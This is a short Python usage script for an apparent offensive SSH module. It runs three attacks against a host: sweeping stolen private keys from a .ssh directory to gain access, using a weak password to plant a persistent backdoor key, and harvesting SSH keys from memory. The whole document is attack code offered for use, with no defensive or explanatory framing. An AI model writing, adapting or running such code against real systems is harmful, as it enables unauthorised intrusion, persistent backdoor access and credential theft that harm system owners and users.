from attacks.key_auth import SSHKeyAuth

# Example configuration
config = {
    'key_timeout': 15,
    'key_dir': 'data/keys'
}

# Initialize key auth module
key_attacker = SSHKeyAuth(config)

# 1. Run key sweep attack
result = key_attacker.run_key_attack(
    host='10.0.0.1',
    mode='sweep',
    search_dir='/home/user/.ssh'
)
if result:
    print(f"Access gained with key: {result['key_path']} as {result['username']}")

# 2. Deploy backdoor key
key_attacker.generate_persistent_keypair('backdoor_key')
result = key_attacker.run_key_attack(
    host='10.0.0.1',
    mode='deploy',
    username='ubuntu',
    password='weakpassword',
    pub_key_path='backdoor_key.pub'
)
if result:
    print("Backdoor key successfully deployed")

# 3. Harvest keys from memory
result = key_attacker.run_key_attack(
    host='10.0.0.1',
    mode='harvest',
    username='ubuntu',
    password='weakpassword'
)
if result:
    print(f"Found keys in memory: {result['found_keys']}")